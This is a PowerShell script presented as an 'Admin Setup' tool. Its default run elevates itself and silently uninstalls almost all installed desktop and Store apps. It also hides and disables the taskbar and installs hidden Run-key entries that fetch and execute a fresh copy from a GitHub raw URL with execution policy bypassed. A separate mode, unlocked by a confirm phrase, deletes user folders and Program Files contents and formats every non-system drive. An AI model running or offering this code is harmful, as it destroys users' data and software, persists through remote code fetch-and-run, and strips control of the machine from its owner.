<#
.SYNOPSIS
  One Admin Setup script.
  Default: wipe removable apps, hide taskbar, show badges, report, clean caches.
  -Mode HideBar | Badges | WipeDisk | Uninstall | CleanCaches | Repair
  Disk wipe live only with -ConfirmPhrase WIPE-ALL-DATA
#>
[CmdletBinding()]
param(
  [switch]$SkipWipe,
  [switch]$SkipTray,
  [switch]$ShowReport,
  [ValidateSet('All','HideBar','Badges','WipeDisk','Uninstall','CleanCaches','Repair')]
  [string]$Mode = 'All',
  [string]$ConfirmPhrase = ''
)
Set-StrictMode -Version 1
$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

$script:HomeRoot = Join-Path $env:USERPROFILE 'admin'
$script:SelfName = 'Admin-Setup.ps1'
$script:RawUrl = 'https://raw.githubusercontent.com/e24g4vewetq3gwerb/Admin-setup/main/Admin-Setup.ps1'
$script:ReportKept = New-Object System.Collections.Generic.List[string]
$script:ReportCleared = New-Object System.Collections.Generic.List[string]
$script:ReportFailed = New-Object System.Collections.Generic.List[string]
$script:ReportFound = 0

function Get-Prop {
  param($Object, [string]$Name)
  if ($null -eq $Object) { return $null }
  $prop = $Object.PSObject.Properties[$Name]
  if ($prop) { return $prop.Value }
  return $null
}
function Get-SelfPath {
  foreach ($candidate in @($PSCommandPath, (Get-Prop $MyInvocation.MyCommand 'Path'), (Get-Prop $MyInvocation.MyCommand 'Definition'))) {
    if ($candidate -and "$candidate" -like '*.ps1' -and (Test-Path -LiteralPath $candidate)) { return $candidate }
  }
  return $null
}
function Test-IsAdmin {
  $id = [Security.Principal.WindowsIdentity]::GetCurrent()
  return (New-Object Security.Principal.WindowsPrincipal($id)).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}
function Test-NameLike([string]$Name, [string[]]$Patterns) {
  if ([string]::IsNullOrWhiteSpace($Name)) { return $false }
  foreach ($pattern in $Patterns) { if ($Name -like $pattern) { return $true } }
  return $false
}
function Write-Log([string]$Message) {
  New-Item -ItemType Directory -Force -Path $script:HomeRoot | Out-Null
  $line = '{0:yyyy-MM-dd HH:mm:ss} {1}' -f (Get-Date), $Message
  $log = Join-Path $script:HomeRoot 'Admin-Setup.log'
  try { $line | Tee-Object -FilePath $log -Append } catch { Write-Host $line }
}
function Stop-AdminHelpers {
  Get-Process powershell -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne $PID } | ForEach-Object {
    try {
      $cmd = (Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)" -ErrorAction SilentlyContinue).CommandLine
      if ($cmd -and ($cmd -like '*Admin-Setup.ps1*' -or $cmd -like '*Clear-Apps-And-Tray.ps1*' -or $cmd -like '*Wipe-All-Except-Windows.ps1*' -or $cmd -like '*Uninstall-AdminSetup.ps1*')) {
        Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
      }
    } catch {}
  }
}
function Get-FreshScript {
  New-Item -ItemType Directory -Force -Path $script:HomeRoot | Out-Null
  $dest = Join-Path $script:HomeRoot $script:SelfName
  $self = Get-SelfPath
  if ($self -and (Test-Path -LiteralPath $self) -and ([IO.Path]::GetFullPath($self) -ne [IO.Path]::GetFullPath($dest))) {
    try { Copy-Item -LiteralPath $self -Destination $dest -Force } catch {}
  }
  try { Invoke-WebRequest -UseBasicParsing -Uri $script:RawUrl -OutFile $dest } catch {}
  try { Unblock-File -LiteralPath $dest } catch {}
  return $dest
}
function Request-AdminAndExit {
  $self = Get-SelfPath
  if (-not $self) { $self = Get-FreshScript }
  $arg = @('-STA','-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$self`"")
  if ($Mode -ne 'All') { $arg += @('-Mode', $Mode) }
  if ($SkipWipe) { $arg += '-SkipWipe' }
  if ($SkipTray) { $arg += '-SkipTray' }
  if ($ShowReport) { $arg += '-ShowReport' }
  if ($ConfirmPhrase) { $arg += @('-ConfirmPhrase', $ConfirmPhrase) }
  Start-Process -FilePath "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" -Verb RunAs -ArgumentList $arg | Out-Null
}
function Invoke-UninstallCommand([string]$Command) {
  if ([string]::IsNullOrWhiteSpace($Command)) { return $false }
  if ($Command -match '(?i)explorer(\.exe)?') { return $false }
  try {
    if ($Command -match '\{([0-9A-Fa-f-]{36})\}') {
      $p = Start-Process -FilePath 'msiexec.exe' -ArgumentList @("/X{$($Matches[1])}", '/qn', '/norestart') -Wait -PassThru -WindowStyle Hidden
      return ($p.ExitCode -in 0, 1605, 1614, 1641, 3010)
    }
    $exe = $Command; $args = ''
    if ($Command -match '^"([^"]+)"\s*(.*)$') { $exe = $Matches[1]; $args = [string]$Matches[2] }
    elseif ($Command -match '^(\S+)\s*(.*)$') { $exe = $Matches[1]; $args = [string]$Matches[2] }
    if ($exe -match '(?i)explorer(\.exe)?$' -or -not (Test-Path -LiteralPath $exe)) { return $false }
    if (("$args").ToLowerInvariant() -notmatch '/s\b|/silent|/quiet|/qn') { $args = ("$args /S /silent /quiet /norestart").Trim() }
    $p = Start-Process -FilePath $exe -ArgumentList $args -Wait -PassThru -WindowStyle Hidden
    return ($null -eq $p.ExitCode -or $p.ExitCode -in 0, 1, 1605, 1614, 1641, 3010)
  } catch { return $false }
}
function Invoke-ClearWin32Apps {
  $protect = @('Microsoft Visual C++*','Microsoft Visual Studio* Redistributable*','Microsoft .NET*','Microsoft Edge*','Microsoft Edge WebView2*','Microsoft Update*','Windows PC Health Check*','Update for *','Security Update*','Hotfix*','Intel*','NVIDIA*','AMD*','Chipset*','Canon *','HP *','Printer*','Driver*','Windows Terminal*','Windows SDK*','Microsoft Windows*','Windows Malicious Software Removal*')
  $paths = @('HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*')
  $removed = 0
  foreach ($prog in @(Get-ItemProperty $paths -ErrorAction SilentlyContinue)) {
    $name = [string](Get-Prop $prog 'DisplayName')
    if (-not $name) { continue }
    $script:ReportFound++
    $systemComponent = Get-Prop $prog 'SystemComponent'
    if ($null -ne $systemComponent) { try { if ([int]$systemComponent -eq 1) { [void]$script:ReportKept.Add("system  $name"); continue } } catch {} }
    if (Test-NameLike $name $protect) { [void]$script:ReportKept.Add("keep    $name"); continue }
    $uninstall = [string](Get-Prop $prog 'QuietUninstallString')
    if (-not $uninstall) { $uninstall = [string](Get-Prop $prog 'UninstallString') }
    if (-not $uninstall) { [void]$script:ReportKept.Add("no-uninstaller  $name"); continue }
    if (Invoke-UninstallCommand $uninstall) { $removed++; [void]$script:ReportCleared.Add($name) } else { [void]$script:ReportFailed.Add($name) }
  }
  return $removed
}
function Invoke-ClearStoreApps {
  $keepAppx = @('Microsoft.WindowsStore','Microsoft.StorePurchaseApp','Microsoft.WindowsTerminal','MicrosoftWindows.Client*','Microsoft.Windows.*','Microsoft.UI.*','Microsoft.VCLibs*','Microsoft.Services.Store*','windows.immersivecontrolpanel','Microsoft.DesktopAppInstaller','Microsoft.SecHealthUI','Microsoft.MicrosoftEdge*','Microsoft.ECApp','Microsoft.LockApp','Microsoft.AAD.BrokerPlugin','Microsoft.AccountsControl','Microsoft.BioEnrollment','Microsoft.CredDialogHost','Microsoft.Win32WebViewHost','Microsoft.XboxGameCallableUI','Microsoft.PPIProjection')
  $removed = 0
  foreach ($pkg in @(Get-AppxPackage -AllUsers -ErrorAction SilentlyContinue)) {
    $name = [string]$pkg.Name
    if (-not $name) { continue }
    $script:ReportFound++
    if ($pkg.IsFramework -or $pkg.NonRemovable) { [void]$script:ReportKept.Add("store-system  $name"); continue }
    if (Test-NameLike $name $keepAppx) { [void]$script:ReportKept.Add("store-keep  $name"); continue }
    if ($name -like 'Microsoft.Windows.*' -or $name -like 'Windows.*') { [void]$script:ReportKept.Add("store-keep  $name"); continue }
    try { Remove-AppxPackage -Package $pkg.PackageFullName -AllUsers -ErrorAction SilentlyContinue; $removed++; [void]$script:ReportCleared.Add("Store: $name") }
    catch { try { Remove-AppxPackage -Package $pkg.PackageFullName -ErrorAction SilentlyContinue; $removed++; [void]$script:ReportCleared.Add("Store: $name") } catch { [void]$script:ReportFailed.Add("Store: $name") } }
  }
  return $removed
}
function Invoke-CleanCaches {
  Write-Log 'CleanCaches start'
  $targets = New-Object System.Collections.Generic.List[string]
  foreach ($p in @($env:TEMP, (Join-Path $env:SystemRoot 'Temp'), (Join-Path $env:LOCALAPPDATA 'Temp'), (Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\INetCache'), (Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\Explorer'))) {
    if ($p -and (Test-Path -LiteralPath $p)) { [void]$targets.Add($p) }
  }
  $n = 0
  foreach ($root in $targets) {
    Get-ChildItem -LiteralPath $root -Force -ErrorAction SilentlyContinue | ForEach-Object {
      try { Remove-Item -LiteralPath $_.FullName -Recurse -Force -ErrorAction SilentlyContinue; $n++ } catch {}
    }
  }
  try { Clear-RecycleBin -Force -ErrorAction SilentlyContinue } catch {
    try { (New-Object -ComObject Shell.Application).NameSpace(0xA).Items() | ForEach-Object { $_.InvokeVerb('delete') } } catch {}
  }
  Write-Log "CleanCaches removed-items~$n"
  [void]$script:ReportCleared.Add("Caches/temp/recycle ($n items attempted)")
}
function Invoke-Repair {
  Write-Log 'Repair start'
  try { ipconfig /flushdns | Out-Null } catch {}
  $iconCache = Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\Explorer'
  Get-ChildItem -LiteralPath $iconCache -Filter 'iconcache*' -Force -ErrorAction SilentlyContinue | ForEach-Object { try { Remove-Item -LiteralPath $_.FullName -Force } catch {} }
  Get-ChildItem -LiteralPath $iconCache -Filter 'thumbcache*' -Force -ErrorAction SilentlyContinue | ForEach-Object { try { Remove-Item -LiteralPath $_.FullName -Force } catch {} }
  try { Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue } catch {}
  Start-Sleep -Seconds 2
  Start-Process explorer.exe | Out-Null
  $null = Get-FreshScript
  Set-NoTaskbar
  [void]$script:ReportCleared.Add('Repair: DNS flush, icon cache, Explorer restart, badges relaunch')
  Write-Log 'Repair done'
}
function Invoke-WipeDisk {
  $live = ($ConfirmPhrase -eq 'WIPE-ALL-DATA')
  Write-Log "WipeDisk live=$live"
  function Remove-PathLocal([string]$Path) {
    if ([string]::IsNullOrWhiteSpace($Path) -or -not (Test-Path -LiteralPath $Path)) { return }
    if ($Path.StartsWith($script:HomeRoot, [StringComparison]::OrdinalIgnoreCase)) { Write-Log "KEEP $Path"; return }
    Write-Log "CLEAR $Path"
    if (-not $live) { return }
    cmd /c "attrib -s -h -r `"$Path`" /s /d >nul 2>&1"
    cmd /c "takeown /F `"$Path`" /R /D Y >nul 2>&1"
    cmd /c "icacls `"$Path`" /grant Administrators:F /T /C /Q >nul 2>&1"
    try { Remove-Item -LiteralPath $Path -Recurse -Force -ErrorAction SilentlyContinue } catch {}
    if (Test-Path -LiteralPath $Path -PathType Container) {
      $empty = Join-Path $env:TEMP ('e' + [guid]::NewGuid().ToString('N'))
      New-Item -ItemType Directory -Force -Path $empty | Out-Null
      cmd /c "robocopy `"$empty`" `"$Path`" /MIR /R:0 /W:0 /NFL /NDL /NJH /NJS >nul"
      cmd /c "rd /s /q `"$Path`""
      Remove-Item -LiteralPath $empty -Force -ErrorAction SilentlyContinue
    }
  }
  $os = $env:SystemDrive.TrimEnd(':')
  $shell = New-Object -ComObject Shell.Application
  $known = @()
  foreach ($id in 5, 0x10, 0x13, 0x27, 13, 14, 39) {
    try { $f = $shell.NameSpace($id); if ($f -and $f.Self.Path) { $known += $f.Self.Path } } catch {}
  }
  $known += @(
    [Environment]::GetFolderPath('MyDocuments'),
    [Environment]::GetFolderPath('MyPictures'),
    [Environment]::GetFolderPath('MyVideos'),
    [Environment]::GetFolderPath('MyMusic'),
    [Environment]::GetFolderPath('Desktop'),
    (Join-Path $env:USERPROFILE 'Downloads'),
    (Join-Path $env:USERPROFILE 'Documents'),
    (Join-Path $env:USERPROFILE 'Desktop'),
    (Join-Path $env:USERPROFILE 'Pictures'),
    (Join-Path $env:USERPROFILE 'Videos'),
    (Join-Path $env:USERPROFILE 'Music'),
    (Join-Path $env:USERPROFILE 'OneDrive')
  ) | Select-Object -Unique
  foreach ($p in $known) { Remove-PathLocal $p }
  foreach ($p in @((Join-Path $env:SystemDrive 'Program Files'), (Join-Path $env:SystemDrive 'Program Files (x86)'), (Join-Path $env:SystemDrive 'ProgramData'))) {
    if (Test-Path -LiteralPath $p) {
      Get-ChildItem -LiteralPath $p -Force -ErrorAction SilentlyContinue | Where-Object {
        $_.Name -notmatch '^(Microsoft|Windows|Package Cache|Microsoft OneDrive)$'
      } | ForEach-Object { Remove-PathLocal $_.FullName }
    }
  }
  Get-CimInstance Win32_LogicalDisk | Where-Object { $_.DriveType -in 2, 3 } | ForEach-Object {
    $letter = $_.DeviceID.TrimEnd(':').TrimEnd('\')
    if ($letter -eq $os) { Write-Log "SKIP OS $($_.DeviceID)"; return }
    Write-Log "WIPE VOLUME $($_.DeviceID)"
    if (-not $live) { return }
    $ok = $false
    try { Format-Volume -DriveLetter $letter -FileSystem NTFS -NewFileSystemLabel 'DATA' -Force -Confirm:$false -ErrorAction Stop | Out-Null; $ok = $true; Write-Log "FORMATTED $letter" } catch { Write-Log "FORMAT FAIL $letter $($_.Exception.Message)" }
    if (-not $ok) {
      $root = $letter + ':\'
      Get-ChildItem -LiteralPath $root -Force -ErrorAction SilentlyContinue | ForEach-Object { Remove-PathLocal $_.FullName }
    }
  }
}
function Invoke-UninstallSelf {
  Write-Log 'Uninstall Admin Setup'
  Stop-AdminHelpers
  $runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
  foreach ($name in @('AdminSetupHideTaskbar','AdminSetupFolderLogo','AdminSetupTray')) {
    try { Remove-ItemProperty -Path $runKey -Name $name -Force -ErrorAction SilentlyContinue } catch {}
  }
  $pol = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer'
  foreach ($name in @('NoTrayItemsDisplay','HideClock','HideSCAHealth','HideSCAMeetNow','HideSCANetwork','HideSCAVolume','HideSCAPower','NoAutoTrayNotify','NoSetTaskbar','NoTrayContextMenu')) {
    try { Remove-ItemProperty -Path $pol -Name $name -Force -ErrorAction SilentlyContinue } catch {}
  }
  Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public static class TrayShow {
  [DllImport("user32.dll", CharSet=CharSet.Auto)] public static extern IntPtr FindWindow(string c, string w);
  [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);
  [DllImport("user32.dll")] public static extern bool EnableWindow(IntPtr h, bool e);
  public static void Show() {
    IntPtr a = FindWindow("Shell_TrayWnd", null);
    if (a != IntPtr.Zero) { ShowWindow(a, 5); EnableWindow(a, true); }
    IntPtr b = FindWindow("Shell_SecondaryTrayWnd", null);
    if (b != IntPtr.Zero) { ShowWindow(b, 5); EnableWindow(b, true); }
  }
}
'@
  try { [TrayShow]::Show() } catch {}
  try { Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue } catch {}
  Start-Sleep -Seconds 1
  Start-Process explorer.exe | Out-Null
  foreach ($name in @('Admin-Setup.ps1','Clear-Apps-And-Tray.ps1','Wipe-All-Except-Windows.ps1','Uninstall-AdminSetup.ps1')) {
    $p = Join-Path $script:HomeRoot $name
    if (Test-Path -LiteralPath $p) { try { Remove-Item -LiteralPath $p -Force } catch {} }
  }
  Write-Log 'Uninstall done'
}
function Set-NoTaskbar {
  $path = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer'
  New-Item -Path $path -Force | Out-Null
  foreach ($pair in @{ NoTrayItemsDisplay = 1; HideClock = 1; HideSCAHealth = 1; HideSCAMeetNow = 1; HideSCANetwork = 1; HideSCAVolume = 1; HideSCAPower = 1; NoAutoTrayNotify = 1; NoSetTaskbar = 1; NoTrayContextMenu = 1 }.GetEnumerator()) {
    try { New-ItemProperty -Path $path -Name $pair.Key -Value $pair.Value -PropertyType DWord -Force | Out-Null } catch {}
  }
  $dest = Get-FreshScript
  $runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
  New-Item -Path $runKey -Force | Out-Null
  $ps = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
  New-ItemProperty -Path $runKey -Name 'AdminSetupHideTaskbar' -Value "`"$ps`" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$dest`" -Mode HideBar" -PropertyType String -Force | Out-Null
  New-ItemProperty -Path $runKey -Name 'AdminSetupFolderLogo' -Value "`"$ps`" -STA -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$dest`" -Mode Badges" -PropertyType String -Force | Out-Null
  Stop-AdminHelpers
  Start-Sleep -Milliseconds 300
  Start-Process -FilePath $ps -WindowStyle Hidden -ArgumentList @('-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',"`"$dest`"",'-Mode','HideBar') | Out-Null
  Start-Process -FilePath $ps -WindowStyle Hidden -ArgumentList @('-STA','-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',"`"$dest`"",'-Mode','Badges') | Out-Null
}
function Show-WipeReport {
  Add-Type -AssemblyName System.Windows.Forms
  Add-Type -AssemblyName System.Drawing
  $lines = New-Object System.Collections.Generic.List[string]
  [void]$lines.Add("Admin-Setup  $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')")
  [void]$lines.Add("Computer  $env:COMPUTERNAME    User  $env:USERNAME")
  [void]$lines.Add('')
  [void]$lines.Add("Found     $($script:ReportFound)")
  [void]$lines.Add("Cleared   $($script:ReportCleared.Count)")
  [void]$lines.Add("Kept      $($script:ReportKept.Count)")
  [void]$lines.Add("Failed    $($script:ReportFailed.Count)")
  [void]$lines.Add('')
  [void]$lines.Add('--- Cleared ---')
  if ($script:ReportCleared.Count -eq 0) { [void]$lines.Add('(none)') } else { $script:ReportCleared | Sort-Object | ForEach-Object { [void]$lines.Add($_) } }
  [void]$lines.Add('')
  [void]$lines.Add('--- Failed ---')
  if ($script:ReportFailed.Count -eq 0) { [void]$lines.Add('(none)') } else { $script:ReportFailed | Sort-Object | ForEach-Object { [void]$lines.Add($_) } }
  [void]$lines.Add('')
  [void]$lines.Add('--- Kept ---')
  if ($script:ReportKept.Count -eq 0) { [void]$lines.Add('(none)') } else { $script:ReportKept | Sort-Object | ForEach-Object { [void]$lines.Add($_) } }
  $text = $lines -join [Environment]::NewLine
  try { $text | Set-Content -Path (Join-Path $script:HomeRoot 'Admin-Setup-last.txt') -Encoding UTF8 } catch {}
  $win = New-Object System.Windows.Forms.Form
  $win.Text = 'Admin Setup - what ran'
  $win.Size = New-Object System.Drawing.Size(720, 560)
  $win.StartPosition = 'CenterScreen'
  $win.TopMost = $true
  $box = New-Object System.Windows.Forms.TextBox
  $box.Multiline = $true; $box.ScrollBars = 'Both'; $box.ReadOnly = $true; $box.Dock = 'Fill'
  $box.Font = New-Object System.Drawing.Font('Consolas', 10)
  $box.BackColor = [System.Drawing.Color]::FromArgb(24,24,24)
  $box.ForeColor = [System.Drawing.Color]::FromArgb(220,220,220)
  $box.Text = $text
  $win.Controls.Add($box)
  [void]$win.ShowDialog()
}
function Start-HideBarLoop {
  $mutex = New-Object System.Threading.Mutex($false, 'Local\AdminSetupHideTaskbar')
  if (-not $mutex.WaitOne(0, $false)) { return }
  Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public static class TrayHide {
  [DllImport("user32.dll", CharSet=CharSet.Auto)] public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
  [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
  [DllImport("user32.dll")] public static extern bool EnableWindow(IntPtr hWnd, bool enable);
  [DllImport("user32.dll")] public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
  public static void HideAll() {
    HideOne(FindWindow("Shell_TrayWnd", null));
    HideOne(FindWindow("Shell_SecondaryTrayWnd", null));
    HideOne(FindWindow("NotifyIconOverflowWindow", null));
  }
  static void HideOne(IntPtr hwnd) {
    if (hwnd == IntPtr.Zero) return;
    ShowWindow(hwnd, 0);
    EnableWindow(hwnd, false);
    SetWindowPos(hwnd, IntPtr.Zero, 0, 0, 0, 0, 0x0080 | 0x0001 | 0x0002 | 0x0004);
  }
}
'@
  while ($true) { try { [TrayHide]::HideAll() } catch {}; Start-Sleep -Milliseconds 400 }
}
function Start-BadgeWindow {
  $mutex = New-Object System.Threading.Mutex($false, 'Local\AdminSetupFolderLogo')
  if (-not $mutex.WaitOne(0, $false)) { return }
  Add-Type -AssemblyName PresentationCore, PresentationFramework, WindowsBase, System.Drawing
  function Convert-ToBitmapSource([System.Drawing.Image]$Img) {
    if (-not $Img) { return $null }
    $ms = New-Object System.IO.MemoryStream
    $Img.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
    $ms.Position = 0
    $bmp = New-Object System.Windows.Media.Imaging.BitmapImage
    $bmp.BeginInit(); $bmp.CacheOption = [System.Windows.Media.Imaging.BitmapCacheOption]::OnLoad
    $bmp.StreamSource = $ms; $bmp.EndInit(); $bmp.Freeze(); $ms.Dispose(); return $bmp
  }
  function Get-ExeImage([string]$Path) {
    try { $ico = [System.Drawing.Icon]::ExtractAssociatedIcon($Path); if ($ico) { return Convert-ToBitmapSource $ico.ToBitmap() } } catch { return $null }
  }
  $xaml = @'
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" Title="Launch" WindowStyle="None" AllowsTransparency="True" Background="Transparent" ShowInTaskbar="False" Topmost="True" ResizeMode="NoResize" SizeToContent="WidthAndHeight">
  <StackPanel Orientation="Horizontal" Margin="8,8,8,10">
    <Grid Width="64" Height="64" Margin="0,0,18,0" Cursor="Hand" Name="BtnFolder">
      <Ellipse Fill="#FF2A2A2A" Stroke="#FFE6B422" StrokeThickness="2.2"/>
      <Image Name="ImgFolder" Width="30" Height="30"/>
    </Grid>
    <Grid Width="64" Height="64" Margin="0,0,18,0" Cursor="Hand" Name="BtnPs">
      <Ellipse Fill="#FF172233" Stroke="#FF3B9AE1" StrokeThickness="2.2"/>
      <Image Name="ImgPs" Width="30" Height="30"/>
    </Grid>
    <Grid Width="64" Height="64" Cursor="Hand" Name="BtnScript">
      <Ellipse Fill="#FF14301F" Stroke="#FF3DDC84" StrokeThickness="2.2"/>
      <Viewbox Width="30" Height="30"><Canvas Width="48" Height="48">
        <Path Fill="#FF3DDC84" Data="M 10,16 L 38,16 L 36,42 L 12,42 Z"/>
        <Path Fill="#FF0E1C14" Data="M 18,16 L 18,42 M 24,16 L 24,42 M 30,16 L 30,42" Stroke="#FF0E1C14" StrokeThickness="2"/>
        <Path Fill="#FF3DDC84" Data="M 8,12 L 40,12 L 40,16 L 8,16 Z"/>
        <Path Fill="#FF3DDC84" Data="M 18,6 L 30,6 L 32,12 L 16,12 Z"/>
      </Canvas></Viewbox>
    </Grid>
  </StackPanel>
</Window>
'@
  $window = [Windows.Markup.XamlReader]::Parse($xaml)
  $window.FindName('ImgFolder').Source = (Get-ExeImage (Join-Path $env:SystemRoot 'explorer.exe'))
  $window.FindName('ImgPs').Source = (Get-ExeImage (Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'))
  function Move-ToBottom {
    $window.Left = [Math]::Max(0, ([System.Windows.SystemParameters]::PrimaryScreenWidth - $window.ActualWidth) / 2)
    $window.Top = [System.Windows.SystemParameters]::PrimaryScreenHeight - $window.ActualHeight - 16
  }
  $window.FindName('BtnFolder').Add_MouseLeftButtonUp({ Start-Process explorer.exe $env:USERPROFILE | Out-Null })
  $window.FindName('BtnPs').Add_MouseLeftButtonUp({ Start-Process (Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe') | Out-Null })
  $window.FindName('BtnScript').Add_MouseLeftButtonUp({
    $answer = [System.Windows.MessageBox]::Show("Delete this script, download it again, and run it the same as a fresh start?`n`nContinue?", 'Rerun Admin Setup', 'YesNo', 'Exclamation', 'No')
    if ($answer -ne [System.Windows.MessageBoxResult]::Yes) { return }
    $dest = Join-Path $env:USERPROFILE 'admin\Admin-Setup.ps1'
    New-Item -ItemType Directory -Force -Path (Split-Path $dest) | Out-Null
    $tmp = Join-Path $env:TEMP ('Admin-Setup-' + [guid]::NewGuid().ToString('N') + '.ps1')
    try { Invoke-WebRequest -UseBasicParsing -Uri 'https://raw.githubusercontent.com/e24g4vewetq3gwerb/Admin-setup/main/Admin-Setup.ps1' -OutFile $tmp }
    catch { [System.Windows.MessageBox]::Show("Download failed.`n$($_.Exception.Message)", 'Admin Setup') | Out-Null; return }
    Get-Process powershell -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne $PID } | ForEach-Object {
      try {
        $cmd = (Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)" -ErrorAction SilentlyContinue).CommandLine
        if ($cmd -and ($cmd -like '*Admin-Setup.ps1*' -or $cmd -like '*Clear-Apps-And-Tray.ps1*')) { Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue }
      } catch {}
    }
    Start-Sleep -Milliseconds 400
    try { if (Test-Path -LiteralPath $dest) { Remove-Item -LiteralPath $dest -Force } } catch {}
    Copy-Item -LiteralPath $tmp -Destination $dest -Force
    Unblock-File -LiteralPath $dest -ErrorAction SilentlyContinue
    $ps = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
    Start-Process -FilePath $ps -Verb RunAs -ArgumentList @('-STA','-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$dest`"") | Out-Null
  })
  $window.Add_ContentRendered({ Move-ToBottom })
  $timer = New-Object System.Windows.Threading.DispatcherTimer
  $timer.Interval = [TimeSpan]::FromSeconds(3)
  $timer.Add_Tick({ $window.Topmost = $true; Move-ToBottom })
  $timer.Start()
  [void]$window.ShowDialog()
}

if ($Mode -eq 'HideBar') { Start-HideBarLoop; return }
if ($Mode -eq 'Badges') { Start-BadgeWindow; return }
if (-not (Test-IsAdmin)) { Request-AdminAndExit; return }
New-Item -ItemType Directory -Force -Path $script:HomeRoot | Out-Null
Write-Log "Admin-Setup mode=$Mode"
if ($Mode -eq 'Uninstall') { Invoke-UninstallSelf; return }
if ($Mode -eq 'WipeDisk') { Invoke-WipeDisk; Invoke-CleanCaches; return }
if ($Mode -eq 'CleanCaches') { Invoke-CleanCaches; return }
if ($Mode -eq 'Repair') { Invoke-Repair; Show-WipeReport; return }
$win32 = 0; $store = 0
if (-not $SkipWipe) { $win32 = Invoke-ClearWin32Apps; $store = Invoke-ClearStoreApps }
Invoke-CleanCaches
if (-not $SkipTray) { Set-NoTaskbar }
Write-Log "Finished Win32=$win32 Store=$store"
Show-WipeReport
